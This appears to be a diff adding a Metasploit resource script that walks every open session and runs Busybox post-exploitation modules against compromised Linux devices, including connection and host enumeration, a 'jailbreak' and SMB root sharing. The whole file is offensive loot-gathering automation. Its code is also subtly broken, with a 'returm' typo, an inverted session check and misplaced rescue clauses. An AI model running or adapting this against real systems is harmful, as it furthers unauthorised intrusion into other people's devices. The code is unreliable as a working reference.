@@ -1,0 +1,50 @@
+<ruby>
+print_status("Gathering Linux Busybox loot")
+def set_module(mod)
+	run_single("use post/linux/busybox/#{mod}")
+end
+def set_host(session)
+	run_single("set SESSION #{session}")
+end
+def run_module(mod, session)
+	set_module("#{mod}")
+	set_host("#{session}")
+	run_single("run -jq")
+end
+def upgrade_session(session)
+	run_single("sessions -u #{session}")
+end
+def check(session)
+	if session == 0
+		return false
+	else 
+		return true
+	end
+end
+def checkpass(session)
+	if check(session) =~ true
+		print_error("no sessions detected")
+	else 
+		upgrade_session("#{session}")
+		gather("#{session}")
+	end
+end
+def gather(session)
+	run_module("enum_connections", "#{session}")
+	run_module("enum_hosts", "#{session}")
+	run_module("jailbreak", "#{session}")
+	run_module("smb_share_root", "#{session}")
+	rescue ArgumentError => e
+		print_error("Invalid argument: #{e.message}")
+		returm
+	rescue RuntimeError => e
+		print_error(e.message)
+		return
+	rescue ::Exception => e
+		raise e
+end
+framework.sessions.each_key do |session|
+checkpass("#{session}")
+print_status("Complete")
+end
+</ruby>
